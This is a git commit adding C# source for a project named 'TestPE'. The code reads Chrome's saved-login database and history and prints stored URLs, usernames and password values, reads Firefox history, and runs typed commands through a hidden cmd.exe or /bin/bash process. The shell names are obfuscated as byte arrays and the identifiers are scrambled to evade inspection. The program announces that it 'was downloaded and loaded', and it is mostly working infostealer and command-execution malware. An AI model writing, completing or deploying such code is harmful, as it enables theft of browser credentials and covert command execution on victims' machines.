6d9d371e018dcc01393935d5cc9ee9787b04aafe
Pinocchio <jamesmaweu256@gmail.com>
2023-04-13 13:32:35 +0300

    Add project files.

---
+++ ChromeFirefox.cs
@@ -0,0 +1,124 @@
+﻿using System.Data.SQLite;
+using System.Security.Cryptography;
+
+namespace TestPE
+{
+    internal class ChromeFirefox
+    {
+
+        public static List<string> GetChromeHistory()
+        {
+            string chromeHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
+                                       + @"\Google\Chrome\User Data\Default\History";
+            Console.WriteLine("Chhrome History File : " + chromeHistoryFile);
+            List<string> historyList = new List<string>();
+            string connectionString = $"Data Source={chromeHistoryFile};Version=3;";
+
+            try
+            {
+                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
+                {
+                    connection.Open();
+                    string query = "SELECT url, title, visit_count, last_visit_time FROM urls";
+                    using (SQLiteCommand command = new SQLiteCommand(query, connection))
+                    {
+                        using (SQLiteDataReader reader = command.ExecuteReader())
+                        {
+                            while (reader.Read())
+                            {
+                                string url = reader["url"].ToString();
+                                string title = reader["title"].ToString();
+                                int visitCount = int.Parse(reader["visit_count"].ToString());
+                                long lastVisitTime = long.Parse(reader["last_visit_time"].ToString());
+                                DateTime lastVisited = DateTime.FromFileTimeUtc(lastVisitTime);
+
+                                historyList.Add($"[{lastVisited}] {title} ({url})");
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+
+            return historyList;
+        }
+
+        public static void chromPasswords()
+        {
+            string dbPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
+            if (File.Exists(dbPath))
+            {
+                string connectionString = "Data Source=" + dbPath + ";Version=3;";
+                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
+                {
+                    connection.Open();
+                    using (SQLiteCommand command = new SQLiteCommand("SELECT * FROM logins", connection))
+                    {
+                        using (SQLiteDataReader reader = command.ExecuteReader())
+                        {
+                            while (reader.Read())
+                            {
+                                string url = reader["origin_url"].ToString();
+                                string username = reader["username_value"].ToString();
+                                string password = reader["password_value"].ToString();
+                                //byte[] passwordBytes = Convert.FromBase64String(password);    //I dont know why this aint working
+                                //password = System.Text.Encoding.UTF8.GetString(passwordBytes);
+                                Console.WriteLine("URL: " + url);
+                                Console.WriteLine("Username: " + username);
+                                Console.WriteLine("Password: " + password.ToString());
+                                Console.WriteLine("-------------------------");
+                            }
+                        }
+                    }
+                }
+            }
+            else
+            {
+                Console.WriteLine("Chrome password database not found.");
+            }
+            Console.ReadLine();
+        }
+
+        public List<string> GetFirefoxHistory()
+        {
+            string firefoxHistoryFile = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
+                                        + @"\Mozilla\Firefox\Profiles\{PROFILE_NAME}\places.sqlite";        //enter profile name
+            List<string> historyList = new List<string>();
+            string connectionString = $"Data Source={firefoxHistoryFile};Version=3;";
+
+            try
+            {
+                using (SQLiteConnection connection = new SQLiteConnection(connectionString))
+                {
+                    connection.Open();
+                    string query = "SELECT url, title, visit_count, last_visit_date FROM moz_places";
+                    using (SQLiteCommand command = new SQLiteCommand(query, connection))
+                    {
+                        using (SQLiteDataReader reader = command.ExecuteReader())
+                        {
+                            while (reader.Read())
+                            {
+                                string url = reader["url"].ToString();
+                                string title = reader["title"].ToString();
+                                int visitCount = int.Parse(reader["visit_count"].ToString());
+                                long lastVisitTime = long.Parse(reader["last_visit_date"].ToString());
+                                DateTime lastVisited = DateTime.FromFileTimeUtc(lastVisitTime / 1000);
+
+                                historyList.Add($"[{lastVisited}] {title} ({url})");
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("Error: " + ex.Message);
+            }
+
+            return historyList;
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,105 @@
+﻿using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Net;
+
+namespace TestPE
+{
+    internal class Program
+    {
+        static void Main(string[] args)
+        {
+            Console.WriteLine("\n [~] Hello, I was downloaded and loaded Succesfuly.\n");
+            Console.WriteLine("\n [~] Create a webclient sample.\n");
+            WebClient webClient = new WebClient();
+
+            //Console.WriteLine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory));
+            //Console.WriteLine(TraverseDirectory(Environment.GetFolderPath(Environment.SpecialFolder.Personal)));
+            List<string> list = new List<string>();
+            list = ChromeFirefox.GetChromeHistory();
+            foreach (string item in list)
+            {
+                //Console.WriteLine(item);
+            }
+            ChromeFirefox.chromPasswords();
+
+            Console.Write("[!] Enter something to run : ");
+            string idkwhatyet = Console.ReadLine();
+
+            while (!string.IsNullOrEmpty(idkwhatyet))
+            {
+                Console.WriteLine(hghbfjyfhtdgvdcxrfsxwertcevrtbrytnuygumiuntubyurvtcxrsgesxge(idkwhatyet));
+                Console.Write("[!] Enter something to run : ");
+                idkwhatyet = Console.ReadLine();
+                Console.WriteLine(hghbfjyfhtdgvdcxrfsxwertcevrtbrytnuygumiuntubyurvtcxrsgesxge(idkwhatyet));
+            }
+
+            Console.ReadKey();
+        }
+
+        public static string hghbfjyfhtdgvdcxrfsxwertcevrtbrytnuygumiuntubyurvtcxrsgesxge(string UBFdsCKumrgfuKzRLAkzWnAjfbQLDxGHJzkf)
+        {
+            try
+            {
+                string FeDGuzjZtfxEZBqtSyMXcUYzxEJbjdRWYdsz = "";
+                Process JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA = new Process();
+
+                var ZSZmePjNNvrdgbXVmAWmfBkfZJxsrYWfrssT = "";
+                var RVQDHLjCgHveAeyjydkzjyZfaXYKykVqjACZ = youcantseeme(new byte[] { 47, 98, 105, 110, 47, 98, 97, 115, 104 });
+                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
+                {
+                    RVQDHLjCgHveAeyjydkzjyZfaXYKykVqjACZ = youcantseeme(new byte[] { 99, 109, 100, 46, 101, 120, 101 });
+                    ZSZmePjNNvrdgbXVmAWmfBkfZJxsrYWfrssT = youcantseeme(new byte[] { 47, 99, 32 });
+                }
+
+                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.FileName = RVQDHLjCgHveAeyjydkzjyZfaXYKykVqjACZ;
+                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.Arguments = ZSZmePjNNvrdgbXVmAWmfBkfZJxsrYWfrssT + UBFdsCKumrgfuKzRLAkzWnAjfbQLDxGHJzkf;
+                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.UseShellExecute = false;
+                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.CreateNoWindow = true;
+                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
+                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.RedirectStandardError = true;
+                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StartInfo.RedirectStandardOutput = true;
+                JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.Start();
+
+                FeDGuzjZtfxEZBqtSyMXcUYzxEJbjdRWYdsz += JuPzpYXAEudzbMQJsHbLNUaFRESeEeFRDGCA.StandardOutput.ReadToEnd();
+
+                return FeDGuzjZtfxEZBqtSyMXcUYzxEJbjdRWYdsz;
+            }
+            catch (Exception LRBYLbGeKpzZpNjeBdBnAauhhkqBBfVGFScf)
+            {
+                return LRBYLbGeKpzZpNjeBdBnAauhhkqBBfVGFScf.Message.ToString();
+            }
+
+        }
+
+        public static string youcantseeme(byte[] byyte)
+        {
+            string canyouseeme = Encoding.Default.GetString(byyte);
+            return canyouseeme;
+        }
+
+        public static string TraverseDirectory(string dirPath)
+        {
+            StringBuilder sb = new StringBuilder();
+            try
+            {
+                foreach (string file in Directory.GetFiles(dirPath))
+                {
+                    sb.AppendLine(file);
+                }
+
+                foreach (string subDir in Directory.GetDirectories(dirPath))
+                {
+                    sb.Append(TraverseDirectory(subDir));
+                }
+            }
+            catch (UnauthorizedAccessException)
+            {
+                
+            }
+
+            return sb.ToString();
+        }
+
+    }
+}
